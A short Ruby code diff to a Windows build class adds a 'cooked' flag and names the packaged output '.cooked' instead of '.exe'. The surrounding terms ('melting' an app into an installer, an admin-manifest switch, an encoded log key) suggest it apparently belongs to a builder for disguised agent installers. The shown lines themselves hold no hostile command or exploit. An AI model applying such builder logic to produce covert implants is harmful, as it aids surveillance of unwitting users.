@@ -58,6 +58,7 @@ class BuildWindows < Build
     trace :debug, "Build: melting: #{params}"
 
     @appname = params['appname'] || 'install'
+    @cooked = false
 
     manifest = (params['admin'] == true) ? '1' : '0'
 
@@ -70,7 +71,7 @@ class BuildWindows < Build
     end
 
     if params['cooked'] == true
-
+      @cooked = true
       key = @factory.logkey.chr.ord
       key = "%02X" % ((key > 127) ? (key - 256) : key)
 
@@ -117,7 +118,7 @@ class BuildWindows < Build
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(@appname + '.exe', "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      z.file.open(@appname + (@cooked ? '.cooked' : '.exe'), "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
